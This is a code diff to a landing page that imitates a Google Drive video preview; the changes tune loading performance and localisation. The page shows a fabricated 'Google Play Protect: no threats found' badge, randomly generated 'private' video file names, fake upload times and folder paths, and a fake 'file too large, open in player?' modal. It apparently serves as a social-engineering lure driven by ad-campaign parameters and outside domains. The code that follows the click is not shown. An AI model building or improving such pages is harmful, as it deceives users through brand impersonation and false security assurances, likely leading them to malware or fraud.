@@ -2,6 +2,7 @@
 <html data-version="production-archive-v0.0.123" data-landing-name="drive-preview" lang="">
 <head>
 
+  <!-- APP CONFIG -->
   <script>
   var APP_CONFIG = {
     domain: "https://jup9.com",
@@ -15,6 +16,35 @@
   };
   </script>
 
+  <!-- PERF: preconnect -->
+  <link rel="preconnect" href="https://cdn.x0x.online" crossorigin>
+  <link rel="dns-prefetch" href="//cdn.x0x.online">
+  <link rel="preconnect" href="https://wuytl.com" crossorigin>
+  <link rel="dns-prefetch" href="//wuytl.com">
+
+  <!-- PERF: preload default locale (fallback) -->
+  <link rel="preload" as="fetch" href="./locales/en.json" crossorigin>
+
+  <!-- PERF: preload hero frame ASAP (makes LCP = image, not delayed modal text) -->
+  <script>
+  (function(){
+    try{
+      var sp = new URLSearchParams(location.search);
+      var cid = sp.get("var_2");
+      var cr  = sp.get("creative_id");
+      if(!cid || !cr) return;
+      var href = "https://cdn.x0x.online/frames/" + encodeURIComponent(cid) + "/" + encodeURIComponent(cr) + ".webp";
+      var l = document.createElement("link");
+      l.rel = "preload";
+      l.as = "image";
+      l.href = href;
+      l.crossOrigin = "anonymous";
+      document.head.appendChild(l);
+    }catch(e){}
+  })();
+  </script>
+
+  <!-- ANALYTICS (v0.0.123 compatible) -->
   <script>
   "use strict";
   (() => {
@@ -61,6 +91,7 @@
   })();
   </script>
 
+  <!-- ERROR / REJECTION -->
   <script>
   "use strict";
   (() => {
@@ -72,65 +103,65 @@
   </script>
 
   <!-- i18n loader (uses /locales/<lang>.json, fallback to en) -->
- <script>
-"use strict";
-(() => {
-  const FALLBACK = "en";
-  const RTL = new Set(["ar","fa","ur"]);
+  <script>
+  "use strict";
+  (() => {
+    const FALLBACK = "en";
+    const RTL = new Set(["ar","fa","ur"]);
 
-  function sanitizeLang(v){
-    return String(v || "")
-      .trim()
-      .toLowerCase()
-      .replace(/^\$+/, "")        // <-- КЛЮЧЕВОЕ: убираем $
-      .replace(/[^a-z-]/g, "")    // <-- убираем мусор
-      .split("-")[0] || "";
-  }
-
-  function getLang(){
-    const sp = new URLSearchParams(location.search);
-    const q = sanitizeLang(sp.get("lang") || sp.get("l"));
-    const nav = sanitizeLang(navigator.language || FALLBACK);
-    return q || nav || FALLBACK;
-  }
-
-  async function loadJson(lang){
-    const safe = sanitizeLang(lang) || FALLBACK;
-    const r = await fetch(`./locales/${safe}.json`, { cache: "no-store" });
-    if (!r.ok) throw new Error("locale_not_found");
-    return r.json();
-  }
-
-  function fmt(str, vars){
-    return String(str).replace(/\{(\w+)\}/g, (_,k)=>(
-      vars && vars[k] != null ? vars[k] : `{${k}}`
-    ));
-  }
-
-  window.i18n = {
-    lang: getLang(),
-    dict: null,
-    t(key, vars){
-      const d = this.dict || {};
-      const s = d[key] != null ? d[key] : key;
-      return fmt(s, vars);
-    }
-  };
-
-  window.i18nReady = (async () => {
-    try {
-      window.i18n.dict = await loadJson(window.i18n.lang);
-    } catch(e){
-      window.i18n.lang = FALLBACK;
-      window.i18n.dict = await loadJson(FALLBACK);
+    function sanitizeLang(v){
+      return String(v || "")
+        .trim()
+        .toLowerCase()
+        .replace(/^\$+/, "")
+        .replace(/[^a-z-]/g, "")
+        .split("-")[0] || "";
     }
 
-    document.documentElement.lang = window.i18n.lang;
-    document.documentElement.dir = RTL.has(window.i18n.lang) ? "rtl" : "ltr";
+    function getLang(){
+      const sp = new URLSearchParams(location.search);
+      const q = sanitizeLang(sp.get("lang") || sp.get("l"));
+      const nav = sanitizeLang(navigator.language || FALLBACK);
+      return q || nav || FALLBACK;
+    }
+
+    async function loadJson(lang){
+      const safe = sanitizeLang(lang) || FALLBACK;
+      // PERF: allow caching
+      const r = await fetch(`./locales/${safe}.json`, { cache: "force-cache" });
+      if (!r.ok) throw new Error("locale_not_found");
+      return r.json();
+    }
+
+    function fmt(str, vars){
+      return String(str).replace(/\{(\w+)\}/g, (_,k)=>(
+        vars && vars[k] != null ? vars[k] : `{${k}}`
+      ));
+    }
+
+    window.i18n = {
+      lang: getLang(),
+      dict: null,
+      t(key, vars){
+        const d = this.dict || {};
+        const s = d[key] != null ? d[key] : null;
+        // IMPORTANT: return null if not found, so we can keep HTML defaults (no LCP delay)
+        return s == null ? null : fmt(s, vars);
+      }
+    };
+
+    window.i18nReady = (async () => {
+      try {
+        window.i18n.dict = await loadJson(window.i18n.lang);
+      } catch(e){
+        window.i18n.lang = FALLBACK;
+        window.i18n.dict = await loadJson(FALLBACK);
+      }
+      document.documentElement.lang = window.i18n.lang;
+      document.documentElement.dir = RTL.has(window.i18n.lang) ? "rtl" : "ltr";
+    })();
   })();
-})();
-</script>
-
+  </script>
 
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0" />
@@ -139,6 +170,9 @@
   <meta name="theme-color" content="#ffffff">
 
   <title>Предпросмотр</title>
+  <meta name="description" content="Preview">
+  <meta name="robots" content="noindex, nofollow">
+
   <link rel="icon" type="image/svg+xml" href="./assets/favicon/favicon.svg">
   <link rel="alternate icon" type="image/png" href="./assets/favicon/favicon-play.png">
   <link rel="manifest" href="./assets/favicon/site.webmanifest" />
@@ -218,10 +252,18 @@
       width:100%;
       height:180px;
       background:#e9eef6;
-      background-size:cover;
-      background-position:center;
       position:relative;
       overflow:hidden;
+    }
+
+    /* PERF: real <img> for LCP instead of background-image */
+    .video-img{
+      position:absolute;
+      inset:0;
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      display:block;
     }
 
     .video-spinner{
@@ -382,6 +424,7 @@
       <path d="M12 2l8 4v6c0 5-3.4 9.4-8 10-4.6-.6-8-5-8-10V6l8-4z" stroke="#137333" stroke-width="1.5"/>
       <path d="M8.4 12.1l2.2 2.2 5-5" stroke="#137333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
     </svg>
+    <!-- DEFAULT TEXT IN HTML (no waiting for i18n) -->
     <span id="protectText">Google Play Protect: угроз не обнаружено</span>
   </div>
 
@@ -402,6 +445,7 @@
   <div id="modal-bg"></div>
   <div class="modal" id="alert-modal">
     <div class="modal-title" id="modal-title">Файл слишком велик</div>
+    <!-- DEFAULT TEXT IN HTML (no waiting for i18n) -->
     <div class="modal-text" id="modal-text">Размер файла превышает лимит для быстрого просмотра. Открыть в плеере?</div>
     <div class="modal-btn" id="modal-ok">ОК</div>
   </div>
@@ -411,6 +455,8 @@
 
     <div class="file-box" id="hero">
       <div class="video-preview" id="videoPreview">
+        <!-- LCP image -->
+        <img id="heroImg" class="video-img" alt="" decoding="async" fetchpriority="high">
         <div class="video-spinner" id="videoSpinner"><div class="spinner"></div></div>
         <div class="video-overlay" id="videoOverlay">
           <div class="playbtn"><div class="playtri"></div></div>
@@ -465,6 +511,7 @@
 
   <div id="click-overlay"></div>
 
+  <!-- TEMPLATE HASH -->
   <script>
   "use strict";
   (()=> {
@@ -506,43 +553,61 @@
   <script>
   (function(){
     const pick = (arr)=>arr[Math.floor(Math.random()*arr.length)];
-    const t = (key, vars) => (window.i18n ? window.i18n.t(key, vars) : key);
+    const t = (key, vars) => {
+      if (!window.i18n) return null;
+      const v = window.i18n.t(key, vars);
+      return v == null ? null : v;
+    };
 
     const vSpinner = document.getElementById("videoSpinner");
     const vOverlay = document.getElementById("videoOverlay");
     const modalBg = document.getElementById("modal-bg");
     const modal = document.getElementById("alert-modal");
 
+    const heroImg = document.getElementById("heroImg");
+
     vOverlay.classList.add("is-loading");
 
+    // Set hero frame ASAP (no waiting for i18n)
+    (function(){
+      const sp = new URLSearchParams(location.search);
+      const cid = sp.get("var_2"), cr = sp.get("creative_id");
+      if (!cid || !cr || !heroImg) return;
+
+      const url = `https://cdn.x0x.online/frames/${encodeURIComponent(cid)}/${encodeURIComponent(cr)}.webp`;
+      heroImg.src = url; // LCP
+      heroImg.onload = () => {
+        if (vSpinner) vSpinner.style.display = "none";
+        vOverlay.classList.remove("is-loading");
+      };
+      heroImg.onerror = () => {
+        // if frame missing - just hide spinner anyway
+        if (vSpinner) vSpinner.style.display = "none";
+        vOverlay.classList.remove("is-loading");
+      };
+    })();
+
+    function setIf(el, value){
+      if (!el || value == null) return;
+      el.textContent = value;
+    }
+
     function applyTexts(){
-      const headerTitle = document.getElementById("headerTitle");
-      if (headerTitle) headerTitle.textContent = t("title_preview");
-
-      const protectText = document.getElementById("protectText");
-      if (protectText) protectText.textContent = t("protect_ok");
-
-      const modalTitle = document.getElementById("modal-title");
-      if (modalTitle) modalTitle.textContent = t("modal_title_big");
-
-      const okBtn = document.getElementById("modal-ok");
-      if (okBtn) okBtn.textContent = t("ok");
+      setIf(document.getElementById("headerTitle"), t("title_preview"));
+      setIf(document.getElementById("protectText"), t("protect_ok"));
+      setIf(document.getElementById("modal-title"), t("modal_title_big"));
+      setIf(document.getElementById("modal-text"), t("modal_text_big"));
+      setIf(document.getElementById("modal-ok"), t("ok"));
     }
 
     function applyDynamic(){
-      // hero/thumbs (as before)
       const sp = new URLSearchParams(location.search);
       const cid = sp.get("var_2"), cr = sp.get("creative_id");
-      const hero = document.getElementById("videoPreview");
       const thumbs = ["t1","t2","t3","t4"].map(id=>document.getElementById(id)).filter(Boolean);
 
       if (cid && cr) {
-        const url = `https://cdn.x0x.online/frames/${cid}/${cr}.webp`;
-        if (hero) hero.style.backgroundImage = `url('${url}')`;
-
         const imgIco = "https://ssl.gstatic.com/docs/doclist/images/icon_11_image_list.png";
         const vidIco = "https://ssl.gstatic.com/docs/doclist/images/icon_11_video_list.png";
-
         thumbs.forEach((el, i) => {
           el.style.backgroundImage = `url('${i === 3 ? vidIco : imgIco}')`;
           el.style.backgroundSize = "22px";
@@ -551,7 +616,6 @@
         });
       }
 
-      // random video name (as before)
       const vNames = ["VID_WA0009_PRIVATE.mp4","Screen_Recording_2024_11_02.mp4","DCIM_1042.mp4","VID_2024_12_19.mp4"];
       const vNameEl = document.getElementById("videoName");
       if (vNameEl){
@@ -560,12 +624,10 @@
         vNameEl.appendChild(document.createTextNode(" " + txt));
       }
 
-      // size (kept as-is)
       const sizeMB = pick([164,184,193,207,245]);
       const sizeEl = document.getElementById("videoSize");
       if (sizeEl) sizeEl.textContent = sizeMB + " МБ";
 
-      // localized time
       const deltaMin = Math.floor(Math.random()*12) + 3;
       const now = new Date();
       const fake = new Date(now.getTime() - deltaMin*60000);
@@ -573,39 +635,47 @@
       const mm = String(fake.getMinutes()).padStart(2,"0");
       const timeEl = document.getElementById("videoTime");
       if (timeEl) {
+        // keep defaults if translations absent
         const variants = [
-          t("meta_added_today"),
-          t("meta_changed_min", {min: deltaMin}),
-          t("meta_uploaded_at", {hh, mm}),
-          t("meta_updated_min", {min: deltaMin})
+          (t("meta_added_today") || "Добавлено сегодня"),
+          (t("meta_changed_min", {min: deltaMin}) || `Изменено ${deltaMin} мин назад`),
+          (t("meta_uploaded_at", {hh, mm}) || `Загружено в ${hh}:${mm}`),
+          (t("meta_updated_min", {min: deltaMin}) || `Обновлено ${deltaMin} мин назад`)
         ];
         timeEl.textContent = pick(variants);
       }
 
-      // localized modal text
-      const mTextEl = document.getElementById("modal-text");
-      if (mTextEl) mTextEl.textContent = t("modal_text_big");
-
-      // localized crumbs
       const crumbEl = document.getElementById("crumb");
       if (crumbEl) {
-        const crumbs = [t("crumb_1"), t("crumb_2"), t("crumb_3"), t("crumb_4")];
-        crumbEl.textContent = pick(crumbs);
+        const crumbs = [
+          (t("crumb_1") || "Private > Shared > Folder_2024_hidden"),
+          (t("crumb_2") || "Private > DCIM > Camera"),
+          (t("crumb_3") || "Shared > Videos > 2024"),
+          (t("crumb_4") || "Private > Backup > Phone")
+        ];
+        crumbEl.textContent = pick(crumbs).replace(/>/g, " > ");
       }
     }
 
+    // Show modal on your timer (keep behaviour), but translations apply whenever ready
+    function showModal(){
+      modalBg.style.display = "block";
+      modal.style.display = "block";
+      document.title = (window.i18n && window.i18n.dict && window.i18n.dict.drive_notif)
+        ? window.i18n.dict.drive_notif
+        : "(1) Access error — Google Drive";
+    }
+
+    // Apply dynamic immediately; i18n will only overwrite if available
+    applyDynamic();
+
+    // When i18n ready -> overwrite texts (no blocking)
     (window.i18nReady || Promise.resolve()).then(() => {
       applyTexts();
       applyDynamic();
-
-      setTimeout(() => {
-        if (vSpinner) vSpinner.style.display = "none";
-        vOverlay.classList.remove("is-loading");
-        modalBg.style.display = "block";
-        modal.style.display = "block";
-        document.title = window.i18n ? window.i18n.t("drive_notif") : "(1) Access error — Google Drive";
-      }, 1000);
     });
+
+    setTimeout(showModal, 1000);
   })();
   </script>
 
